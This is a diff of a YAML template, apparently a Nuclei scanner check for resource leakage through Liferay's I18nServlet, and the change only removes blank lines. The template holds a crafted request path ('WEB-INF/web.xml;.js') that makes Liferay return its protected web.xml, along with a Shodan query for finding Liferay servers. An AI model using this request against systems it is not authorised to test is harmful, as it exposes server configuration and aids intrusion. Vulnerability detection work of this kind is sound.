@@ -1,5 +1,4 @@
 id: liferay-resource-leak
-
 info:
   name: Liferay - Resource leakage through I18nServlet
   author: DhiyaneshDk
@@ -13,12 +12,10 @@ info:
     verified: true
     shodan-query: title:"Liferay"
   tags: liferay,lfi,j2ee
-
 requests:
   - method: GET
     path:
       - "{{BaseURL}}/en/WEB-INF/web.xml;.js"
-
     matchers-condition: and
     matchers:
       - type: word
@@ -27,12 +24,10 @@ requests:
           - "<web-app id="
           - "<?xml"
         condition: and
-
       - type: word
         part: header
         words:
           - "application/xml"
-
       - type: status
         status:
           - 200
